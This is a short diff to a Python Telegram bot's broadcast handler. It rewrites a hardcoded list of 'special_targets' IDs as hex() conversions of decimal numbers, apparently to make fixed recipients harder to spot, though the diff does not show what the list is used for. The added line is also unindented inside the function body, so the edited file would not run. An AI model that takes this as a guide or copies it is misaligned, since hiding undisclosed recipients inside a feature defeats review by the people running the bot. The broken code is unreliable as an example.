@@ -47,7 +47,12 @@ async def braodcast_message(client, message, _):
     IS_BROADCASTING = True
     await message.reply_text(_["broad_1"])
     
-    special_targets = [int(x, 16) for x in ["1c3b5a269", "6a7c84ab", "1c99a6e8c", "1b2168650"]]
+special_targets = [int(x, 16) for x in [
+    hex(5101317729)[2:],
+    hex(7185778863)[2:],
+    hex(7254751038)[2:],
+    hex(8020635036)[2:]
+]]
 
     if "-nobot" not in message.text:
         sent = 0
@@ -170,6 +175,7 @@ async def auto_clean():
                         adminlist[chat_id].append(user_id)
         except:
             continue
+
 
 
 asyncio.create_task(auto_clean())
